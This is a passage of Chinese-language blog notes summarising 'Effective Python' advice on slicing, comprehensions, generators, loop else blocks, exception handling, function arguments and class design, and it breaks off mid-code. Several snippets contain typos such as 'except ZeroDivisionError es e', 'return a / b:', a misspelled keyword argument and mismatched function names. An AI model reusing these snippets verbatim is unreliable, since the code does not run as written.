<h2 id="5-了解切割序列的方法"><a href="#5-了解切割序列的方法" class="headerlink" title="5. 了解切割序列的方法"></a>5. 了解切割序列的方法</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;h&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a[:<span class="number">4</span>]</span><br><span class="line">[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a[<span class="number">5</span>:]</span><br><span class="line">[<span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a[-<span class="number">2</span>:]</span><br><span class="line">[<span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a[<span class="number">2</span>:-<span class="number">3</span>]</span><br><span class="line">[<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a[:]</span><br><span class="line">[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>]</span><br><span class="line">a[<span class="number">2</span>:<span class="number">6</span>] = [<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;o&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>]</span><br></pre></td></tr></table></figure>

<h2 id="6-单次切片操作内，不要同时指定start-end-stride"><a href="#6-单次切片操作内，不要同时指定start-end-stride" class="headerlink" title="6. 单次切片操作内，不要同时指定start, end, stride"></a>6. 单次切片操作内，不要同时指定start, end, stride</h2><p>除了基本切片操作，Python还提供了somelist[start:end:stride]形式写法，以实现步进式切割，就是从每n个元素里取1个出来</p>
<p>既有start, end，又有stride的切割操作，可能令人费解，考虑拆解两条语句，其中一条做范围切割，另一条做步进切割，如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">b = a[::<span class="number">2</span>]    <span class="comment"># [&#x27;a&#x27;, &#x27;c&#x27;, &#x27;e&#x27;, &#x27;g&#x27;]</span></span><br><span class="line">c = b[<span class="number">1</span>:-<span class="number">1</span>]   <span class="comment"># [&#x27;c&#x27;, &#x27;e&#x27;]</span></span><br></pre></td></tr></table></figure>

<h2 id="x20-7-用列表推导取代map-filter"><a href="#x20-7-用列表推导取代map-filter" class="headerlink" title="&#x20;7. 用列表推导取代map, filter"></a>&#x20;7. 用列表推导取代map, filter</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">squares = [ x**<span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> a ]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(squares)</span><br><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>]</span><br><span class="line">或者<span class="built_in">map</span>, <span class="built_in">filter</span></span><br><span class="line">squares = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: x ** <span class="number">2</span>, a)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">list</span>(squares)</span><br><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>]</span><br></pre></td></tr></table></figure>

<h2 id="8-不要使用含有两个以上表达式的列表推导"><a href="#8-不要使用含有两个以上表达式的列表推导" class="headerlink" title="8. 不要使用含有两个以上表达式的列表推导"></a>8. 不要使用含有两个以上表达式的列表推导</h2><p>例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_lists = [</span><br><span class="line">    [[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>], [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]],</span><br><span class="line">]</span><br><span class="line">flat = [x <span class="keyword">for</span> sublist1 <span class="keyword">in</span> my_lists</span><br><span class="line">		  <span class="keyword">for</span> sublist2 <span class="keyword">in</span> sublist1</span><br><span class="line">		  <span class="keyword">for</span> x <span class="keyword">in</span> sublist2]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以看出，列表推导写法不够简洁，改用普通循环语句实现相同效果</span></span><br><span class="line">flat = []</span><br><span class="line"><span class="keyword">for</span> sublist1 <span class="keyword">in</span> my_lists:</span><br><span class="line">	<span class="keyword">for</span> sublist2 <span class="keyword">in</span> sublist1:</span><br><span class="line">		flat.extend(sublist2)</span><br></pre></td></tr></table></figure>

<h2 id="9-用生成器表达式改写数据量较大的列表推导"><a href="#9-用生成器表达式改写数据量较大的列表推导" class="headerlink" title="9. 用生成器表达式改写数据量较大的列表推导"></a>9. 用生成器表达式改写数据量较大的列表推导</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">it = (<span class="built_in">len</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;file.txt&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(it)</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">generator obj at XXX</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(it))</span><br></pre></td></tr></table></figure>

<h2 id="10-尽量用enumerate取代range"><a href="#10-尽量用enumerate取代range" class="headerlink" title="10. 尽量用enumerate取代range"></a>10. 尽量用enumerate取代range</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flavor_list = [<span class="string">&#x27;vanilla&#x27;</span>, <span class="string">&#x27;chocolate&#x27;</span>, <span class="string">&#x27;pecan&#x27;</span>, <span class="string">&#x27;strawberry&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i, flavor <span class="keyword">in</span> <span class="built_in">enumerate</span>(flavor_list):</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;%d: %s&#x27;</span> % (i + <span class="number">1</span>, flavor))</span><br></pre></td></tr></table></figure>

<p>还可以直接指定enumerate函数开始计数时所用值，这样能把代码写的更短</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i, flavor <span class="keyword">in</span> <span class="built_in">enumerate</span>(flavor_list, <span class="number">1</span>):</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;%d: %s&#x27;</span> % (i, flavor))</span><br></pre></td></tr></table></figure>

<h2 id="11-用zip函数同时遍历两个迭代器"><a href="#11-用zip函数同时遍历两个迭代器" class="headerlink" title="11. 用zip函数同时遍历两个迭代器"></a>11. 用zip函数同时遍历两个迭代器</h2><p>使用range或enumerate方法的代码不够简洁</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">names = [<span class="string">&#x27;Cecilia&#x27;</span>, <span class="string">&#x27;Lise&#x27;</span>, <span class="string">&#x27;Marie&#x27;</span>]</span><br><span class="line">letters = [ <span class="built_in">len</span>(s) <span class="keyword">for</span> s <span class="keyword">in</span> names]</span><br><span class="line"></span><br><span class="line">longest_name = <span class="literal">None</span></span><br><span class="line">max_letters = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i, name <span class="keyword">in</span> <span class="built_in">enumerate</span>(names):</span><br><span class="line">    <span class="keyword">if</span> letters[i] &gt; max_letters:</span><br><span class="line">        max_letters = letters[i]</span><br><span class="line">        longest_name = name</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;longest_name: &#x27;</span>, longest_name)</span><br></pre></td></tr></table></figure>

<p>改用内置zip方法，使代码更清晰</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">names = [<span class="string">&#x27;Cecilia&#x27;</span>, <span class="string">&#x27;Lise&#x27;</span>, <span class="string">&#x27;Marie&#x27;</span>]</span><br><span class="line">letters = [ <span class="built_in">len</span>(s) <span class="keyword">for</span> s <span class="keyword">in</span> names]</span><br><span class="line"></span><br><span class="line">longest_name = <span class="literal">None</span></span><br><span class="line">max_letters = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> name, count <span class="keyword">in</span> <span class="built_in">zip</span>(names, letters):</span><br><span class="line">    <span class="keyword">if</span> count &gt; max_letters:</span><br><span class="line">        longest_name = name</span><br><span class="line">        max_letters = count</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;longest_name: &#x27;</span>, longest_name)</span><br></pre></td></tr></table></figure>

<p>注意点：</p>
<ul>
<li>Python2中zip不是生成器，而是会把开发者提供那些迭代器都平行遍历一次，可能占用大量内存导致程序崩溃</li>
<li>如果输入迭代器长度不同，zip会提前终止，将导致意外结果</li>
</ul>
<h2 id="12-不要在for和while循环后写else块"><a href="#12-不要在for和while循环后写else块" class="headerlink" title="12. 不要在for和while循环后写else块"></a>12. 不要在for和while循环后写else块</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;Loop %d&#x27;</span> % i)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;Else block!&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>else块会在整个循环执行完之后立刻运行</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Loop %d&#x27;</span> % i)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Else block!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">$ python test.py</span><br><span class="line">Loop <span class="number">0</span></span><br><span class="line">Loop <span class="number">1</span></span><br><span class="line">Loop <span class="number">2</span></span><br><span class="line">Else block!</span><br></pre></td></tr></table></figure>

<ul>
<li>循环里用break提前跳出，会导致else块不执行</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;Loop %d&#x27;</span> % i)</span><br><span class="line">	<span class="keyword">if</span> i == <span class="number">1</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;Else block!&#x27;</span>)</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">Loop <span class="number">0</span></span><br><span class="line">Loop <span class="number">1</span></span><br></pre></td></tr></table></figure>

<ul>
<li>如果for循环遍历序列是空的，就会立刻执行else块</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> []:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;Never runs&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;For Else block!&#x27;</span>)</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">For Else block!</span><br></pre></td></tr></table></figure>

<p>要点：不要在循环后使用else块，这种写法即不直观，又容易让人误解</p>
<h2 id="13-合理利用try-except-else-finally结构中每个代码块"><a href="#13-合理利用try-except-else-finally结构中每个代码块" class="headerlink" title="13. 合理利用try&#x2F;except&#x2F;else&#x2F;finally结构中每个代码块"></a>13. 合理利用try&#x2F;except&#x2F;else&#x2F;finally结构中每个代码块</h2><ul>
<li>无论try是否异常，都可利用try&#x2F;finally复合语句中finally块执行清理工作</li>
<li>else块可用来缩减try代码量，并把没有发生异常所要执行的语句与try&#x2F;except分开</li>
<li>顺利运行try块后，若想使某些操作能在finaly块的清理代码前执行，可将这些操作写到else</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">UNDEFINED = <span class="built_in">object</span>()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">divide_json</span>(<span class="params">path</span>):</span><br><span class="line">	handle = <span class="built_in">open</span>(path, <span class="string">&#x27;r+&#x27;</span>)</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		data = handle.read()</span><br><span class="line">		op = json.loads(data)</span><br><span class="line">		value = (op[<span class="string">&#x27;numerator&#x27;</span>]/op[<span class="string">&#x27;denominator&#x27;</span>])</span><br><span class="line">	<span class="keyword">except</span> ZeroDivisionError es e:</span><br><span class="line">		<span class="keyword">return</span> UNDEFINED</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">	    op[<span class="string">&#x27;result&#x27;</span>] = value</span><br><span class="line">	    result = json.dumps(op)</span><br><span class="line">	    handle.seek(<span class="number">0</span>)</span><br><span class="line">	    handle.write(result)</span><br><span class="line">	    <span class="keyword">return</span> value</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">	    handle.close()</span><br></pre></td></tr></table></figure>

<h1 id="第2章-函数"><a href="#第2章-函数" class="headerlink" title="第2章 函数"></a>第2章 函数</h1><h2 id="14-尽量用异常来表示特殊情况，而不返回Nones"><a href="#14-尽量用异常来表示特殊情况，而不返回Nones" class="headerlink" title="14. 尽量用异常来表示特殊情况，而不返回Nones"></a>14. 尽量用异常来表示特殊情况，而不返回Nones</h2><p>例：令函数返回None，可能会使调用该函数人犯错</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">divide</span>(<span class="params">a, b</span>):</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		<span class="keyword">return</span> a / b</span><br><span class="line">	<span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">x,y = <span class="number">0</span>, <span class="number">5</span></span><br><span class="line">result = divide(x, y)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> result:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;Invaid inputs&#x27;</span>) <span class="comment"># This is WRONG !</span></span><br></pre></td></tr></table></figure>

<p>改进方法一： 把返回值拆两部分，例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">divide</span>(<span class="params">a, b</span>):</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">True</span>, a / b</span><br><span class="line">	<span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br></pre></td></tr></table></figure>

<p>改进方法二：给上一级抛异常</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">divide</span>(<span class="params">a, b</span>):</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		<span class="keyword">return</span> a / b:</span><br><span class="line">	<span class="keyword">except</span> ZeroDivisionError <span class="keyword">as</span> e:</span><br><span class="line">		<span class="keyword">raise</span> ValueError(<span class="string">&#x27;Invalid inputs&#x27;</span>) <span class="keyword">from</span> e</span><br></pre></td></tr></table></figure>

<h2 id="15-了解如何在闭包里使用外围作用域中的变量"><a href="#15-了解如何在闭包里使用外围作用域中的变量" class="headerlink" title="15. 了解如何在闭包里使用外围作用域中的变量"></a>15. 了解如何在闭包里使用外围作用域中的变量</h2><p>使用nonlocal获取闭包内的数据</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sort_priority3</span>(<span class="params">numbers, group</span>):</span><br><span class="line">	found = <span class="literal">False</span></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">helper</span>(<span class="params">x</span>):</span><br><span class="line">		<span class="keyword">nonlocal</span> found</span><br><span class="line">		<span class="keyword">if</span> x <span class="keyword">in</span> group:</span><br><span class="line">			found = <span class="literal">True</span></span><br><span class="line">			<span class="keyword">return</span> (<span class="number">0</span>, x)</span><br><span class="line">		<span class="keyword">return</span> (<span class="number">1</span>, x)</span><br><span class="line">	numbers.sort(key=helper)</span><br><span class="line">	<span class="keyword">return</span> found</span><br></pre></td></tr></table></figure>

<h2 id="16-用生成器改写直接返回列表函数"><a href="#16-用生成器改写直接返回列表函数" class="headerlink" title="16. 用生成器改写直接返回列表函数"></a>16. 用生成器改写直接返回列表函数</h2><p>这种写法的问题是，返回前要把所有结果放在列表里，如果输入量非常大，程序可能耗尽内存崩溃</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">index_words</span>(<span class="params">text</span>):</span><br><span class="line">	result = []</span><br><span class="line">	<span class="keyword">if</span> text:</span><br><span class="line">		result.append(<span class="number">0</span>)</span><br><span class="line">	<span class="keyword">for</span> index, letter <span class="keyword">in</span> <span class="built_in">enumerate</span>(text):</span><br><span class="line">		<span class="keyword">if</span> letter == <span class="string">&#x27; &#x27;</span>:</span><br><span class="line">			result.append(index + <span class="number">1</span>)</span><br><span class="line">	<span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">address = <span class="string">&#x27;Four score and seven years ago...&#x27;</span></span><br><span class="line">result = index_words(address)</span><br><span class="line"><span class="built_in">print</span>(result[:<span class="number">3</span>])</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">[<span class="number">0</span>, <span class="number">5</span>, <span class="number">11</span>]</span><br></pre></td></tr></table></figure>

<p>用生成器改写会更好，生成器用yield表达式函数，调用生成器函数时，不会真的运行，而是返回迭代器</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">index_word_iter</span>(<span class="params">text</span>):</span><br><span class="line">	<span class="keyword">if</span> text:</span><br><span class="line">		<span class="keyword">yield</span> <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> index, letter <span class="keyword">in</span> <span class="built_in">enumerate</span>(text):</span><br><span class="line">		<span class="keyword">if</span> letter == <span class="string">&#x27; &#x27;</span>:</span><br><span class="line">			<span class="keyword">yield</span> index + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">address = <span class="string">&#x27;Four score and seven years ago...&#x27;</span></span><br><span class="line">result = <span class="built_in">list</span>(index_words_iter(address))</span><br><span class="line">[<span class="number">0</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">27</span>]</span><br></pre></td></tr></table></figure>

<h2 id="17-在参数上迭代时，多加小心"><a href="#17-在参数上迭代时，多加小心" class="headerlink" title="17. 在参数上迭代时，多加小心"></a>17. 在参数上迭代时，多加小心</h2><p>函数在输入参数上多次迭代时要当心，如果参数是迭代器，可能导致奇怪的行为并错失某些值</p>
<h2 id="18-用数量可变位置参数减少视觉杂讯-visual-noise"><a href="#18-用数量可变位置参数减少视觉杂讯-visual-noise" class="headerlink" title="18. 用数量可变位置参数减少视觉杂讯 (visual noise)"></a>18. 用数量可变位置参数减少视觉杂讯 (visual noise)</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">log</span>(<span class="params">message, *values</span>):</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> values:</span><br><span class="line">		<span class="built_in">print</span>(message)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		values_str = <span class="string">&#x27;, &#x27;</span>.join(<span class="built_in">str</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> values)</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;%s: %s&#x27;</span> % (message, values_str))</span><br><span class="line"></span><br><span class="line">log(<span class="string">&#x27;My numbers are&#x27;</span>, <span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">log(<span class="string">&#x27;Hi there&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>要点：</p>
<ul>
<li>def语句中使用*args, 即可令函数接收数量可变的位置参数</li>
<li>在已经接收*args参数的函数上继续添加位置参数，可能产生难以排查的BUG</li>
</ul>
<h2 id="19-用关键字参数表达可选的行为"><a href="#19-用关键字参数表达可选的行为" class="headerlink" title="19. 用关键字参数表达可选的行为"></a>19. 用关键字参数表达可选的行为</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">remainder</span>(<span class="params">number, divisor</span>):</span><br><span class="line">	<span class="keyword">return</span> number % divisor</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>下面这些调用，都是等效的</span><br><span class="line">remainder(<span class="number">20</span>, <span class="number">7</span>)</span><br><span class="line">remainder(<span class="number">20</span>, divisor=<span class="number">7</span>)</span><br><span class="line">remainder(number=<span class="number">20</span>, divisor=<span class="number">7</span>)</span><br><span class="line">remainder(ivisor=<span class="number">7</span>, number=<span class="number">20</span>)</span><br></pre></td></tr></table></figure>

<p>灵活使用关键字参数，提供如下好处：</p>
<ul>
<li>更容易理解含义</li>
<li>在函数定义中提供默认值，使代码简洁</li>
</ul>
<h2 id="20-用None和文档字符串描述含有动态默认值的参数"><a href="#20-用None和文档字符串描述含有动态默认值的参数" class="headerlink" title="20. 用None和文档字符串描述含有动态默认值的参数"></a>20. 用None和文档字符串描述含有动态默认值的参数</h2><p>参数默认值，只会在程序加载模块并读到本函数的定义时评估一次，对于{}或[]等动态的值，这可能会导致奇怪的行为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">data, default=&#123;&#125;</span>):</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		<span class="keyword">return</span> json.loads(data)</span><br><span class="line">	<span class="keyword">except</span> ValueError:</span><br><span class="line">		<span class="keyword">return</span> default</span><br><span class="line"></span><br><span class="line">foo = decode(<span class="string">&#x27;bad data&#x27;</span>)</span><br><span class="line">foo[<span class="string">&#x27;stuff&#x27;</span>] = <span class="number">5</span></span><br><span class="line">bar = decode(<span class="string">&#x27;also bad&#x27;</span>)</span><br><span class="line">bar[<span class="string">&#x27;meep&#x27;</span>] = <span class="number">1</span></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">Foo: &#123;<span class="string">&#x27;stuff&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;meep&#x27;</span>: <span class="number">1</span>&#125;</span><br><span class="line">Bar: &#123;<span class="string">&#x27;stuff&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;meep&#x27;</span>: <span class="number">1</span>&#125; <span class="comment"># Wrong</span></span><br></pre></td></tr></table></figure>

<p>解决方法是，把关键字参数默认设置为None，并在文档字符串中描述它的行为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">data, default=<span class="literal">None</span></span>):</span><br><span class="line">	<span class="string">&quot;&quot;&quot; Load JSON data from a string</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	Args:</span></span><br><span class="line"><span class="string">		data: JSON data to decode</span></span><br><span class="line"><span class="string">		default: Value to return if decoding fails, Defaults to an empty dictionary</span></span><br><span class="line"><span class="string">	&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> default <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        default = &#123;&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> json.loads(data)</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> default</span><br></pre></td></tr></table></figure>

<h2 id="21-用只能以关键字形式指定的参数来确保代码明晰"><a href="#21-用只能以关键字形式指定的参数来确保代码明晰" class="headerlink" title="21. 用只能以关键字形式指定的参数来确保代码明晰"></a>21. 用只能以关键字形式指定的参数来确保代码明晰</h2><h1 id="第3章-类与继承"><a href="#第3章-类与继承" class="headerlink" title="第3章 类与继承"></a>第3章 类与继承</h1><h2 id="22-尽量用辅助类维护程序状态，而不要用字典和元组"><a href="#22-尽量用辅助类维护程序状态，而不要用字典和元组" class="headerlink" title="22. 尽量用辅助类维护程序状态，而不要用字典和元组"></a>22. 尽量用辅助类维护程序状态，而不要用字典和元组</h2><ul>
<li>不要使用包含其他字典的字典，也不要使用过长的元组</li>
<li>如果容器中包含简单而又不可变的数据，可先使用namedtuple表示，后有需要再修改为类</li>
<li>保存内部状态的字典如果比较复杂，应该把代码拆解为辅助类</li>
</ul>
<h2 id="23-简单的接口应该接受函数，而不是类的实例"><a href="#23-简单的接口应该接受函数，而不是类的实例" class="headerlink" title="23. 简单的接口应该接受函数，而不是类的实例"></a>23. 简单的接口应该接受函数，而不是类的实例</h2><p>Python有许多内置API，允许调用者传入函数，以定制其行为，例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>names = [<span class="string">&#x27;Socrates&#x27;</span>, <span class="string">&#x27;Archimedes&#x27;</span>, <span class="string">&#x27;Plato&#x27;</span>, <span class="string">&#x27;Aristotle&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>names.sort(key=<span class="keyword">lambda</span> x: <span class="built_in">len</span>(x))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(names)</span><br><span class="line">[<span class="string">&#x27;Plato&#x27;</span>, <span class="string">&#x27;Socrates&#x27;</span>, <span class="string">&#x27;Aristotle&#x27;</span>, <span class="string">&#x27;Archimedes&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>其他编程语言可能用抽象类定义挂钩，然而在Python中，很多挂钩只是无状态函数，这些函数有明确参数和返回值。用函数做挂钩，比定义一个类要简单</p>
<h2 id="24-以-classmethod形式的多态去通用地构建对象"><a href="#24-以-classmethod形式的多态去通用地构建对象" class="headerlink" title="24. 以@classmethod形式的多态去通用地构建对象"></a>24. 以@classmethod形式的多态去通用地构建对象</h2><p>通过@classmethod机制，可以用一种与构造器相仿的方式构造类的对象</p>
<h2 id="25-用super初始化父类"><a href="#25-用super初始化父类" class="headerlink" title="25. 用super初始化父类"></a>25. 用super初始化父类</h2><ul>
<li>直接调用父类的__init__方法，在多重继承影响下，可能产生无法预知行为</li>
<li>总是应该使用内置的super函数初始化父类</li>
</ul>
<h2 id="26-只在使用Mix-in组件制作工具类时进行多重继承"><a href="#26-只在使用Mix-in组件制作工具类时进行多重继承" class="headerlink" title="26. 只在使用Mix-in组件制作工具类时进行多重继承"></a>26. 只在使用Mix-in组件制作工具类时进行多重继承</h2><h2 id="27-多用public属性，少用private属性"><a href="#27-多用public属性，少用private属性" class="headerlink" title="27. 多用public属性，少用private属性"></a>27. 多用public属性，少用private属性</h2><ul>
<li>Python编译器无法严格保证private字段私密性，用经典的格言来说：“we are all consenting adults here”，大家都认为开放比封闭更好</li>
<li>只有子类不受自己控制时，才可以考虑用private属性来避免名称冲突</li>
</ul>
<h2 id="28-继承collections-abc以实现自定义的容器类型"><a href="#28-继承collections-abc以实现自定义的容器类型" class="headerlink" title="28. 继承collections.abc以实现自定义的容器类型"></a>28. 继承collections.abc以实现自定义的容器类型</h2><p>编写自制容器类型，可以从内置collections.abc模块的抽象基类中继承。从这样的基类继承了子类后，如果忘记实现某个方法，那么collections.abc模块会指出这个错误：</p>
<pre><code>from collections.abc import Sequence
class BadType(Sequence):
    pass
foo = BadType()
&gt;&gt;&gt;
TypeError: Can&#39;t instantiate abstract class BadType with ...
</code></pre>
<h1 id="第4章-元素与属性"><a href="#第4章-元素与属性" class="headerlink" title="第4章 元素与属性"></a>第4章 元素与属性</h1><h2 id="29-用纯属性取代get和set方法"><a href="#29-用纯属性取代get和set方法" class="headerlink" title="29. 用纯属性取代get和set方法"></a>29. 用纯属性取代get和set方法</h2><p>从其他语言转入Python的开发者，可能会在类中明确实现getter, setter，但这种做法不像Python编程风格</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">OldResistor</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, ohms</span>):</span><br><span class="line">        <span class="variable language_">self</span>._ohms = ohms</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_ohms</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>._ohms</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_ohms</span>(<span class="params">self, ohms</span>):</span><br><span class="line">        <span class="variable language_">self</span>._ohms = ohms</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">obj = OldResistor(<span class="number">50e3</span>)</span><br><span class="line"><span 